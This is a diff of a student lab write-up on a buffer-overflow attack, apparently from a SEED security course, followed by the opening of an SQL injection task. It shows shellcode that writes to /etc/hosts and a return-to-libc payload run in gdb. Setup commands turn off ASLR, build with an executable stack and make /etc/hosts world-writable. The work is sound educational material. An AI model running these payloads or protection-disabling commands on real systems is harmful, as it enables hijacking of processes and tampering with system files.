@@ -75,7 +75,7 @@ Do the same for the shellcode, copy into the file_del
 Create the file out vuln.o to execute the code
 
 ``` 
-gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2  
+gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
 ```
    Create a file_asm out by these 2 commands
 ``` 
@@ -83,13 +83,15 @@ nasm -g -f elf file_del.asm
 
 ld -m elf_i386 -o file_del file_del.o
 ```
-Then I will get the hexstring of file_del
+Set up the enviroment
 ``` 
-for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+sudo ln -sf /bin/zsh /bin/sh
+
+sudo sysctl -w kernel.randomize_va_space=0
 ```
-Then I have a ressult
+Change perrmission
 ``` 
-\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x127.1.1.1\xgoogle\x2e\x63\x6f\x6d\x.com
+sudo chmod 7777 /etc/hosts
 ``` 
 The picture of the above actions:
 ![createpicture](./img/lab1_pic1.png)
@@ -103,21 +105,29 @@ Stack frame:
 
 To execute the the file_del, it needs to overwrite the buffer
 
-find the shellcode address by
+we redirect the directory
+export mybuf="/home/seed/seclabs/Security-labs/Software/buffer-overflow/file_del"
+
+find the payload by
 ``` 
 gdb -q vuln.out  
 ``` 
 
+![createpicture](./img/libc.png)
+![createpicture](./img/findthepayload.png)
+Then we collect the payload that can conduct buffer-overflow to the return address like in the stackframe
 
-gcc -g -m32 -fno-stack-protector -z execstack -o vuln.out vuln.c
-
-export mybuf="/home/seed/seclabs/Security-labs/Software/buffer-overflow/file_del"
-
-![createpicture](./img/libc%20(2).png)
+payload = padding + system_addr + exit_addr + "/bin/sh"
 ```
-r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x2a\xdf\xff\xff')")
+r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x09\xdf\xff\xff')")
 ```
 **Conclusion**: comment text about the screenshot or simply answered text for the question
+
+After run the payload in gdb wwe have
+![createpicture](./img/runpayload.png)
+
+Then we check again the /cat/host directory, we have see the new part 127.1.1.1 google.com. That means we insert and conduct the buffer-overflow sucessfully 
+![createpicture](./img/chenThanhcong.png)
 # Task 2: Attack on the database of Vulnerable App from SQLi lab 
 - Start docker container from SQLi. 
 - Install sqlmap.
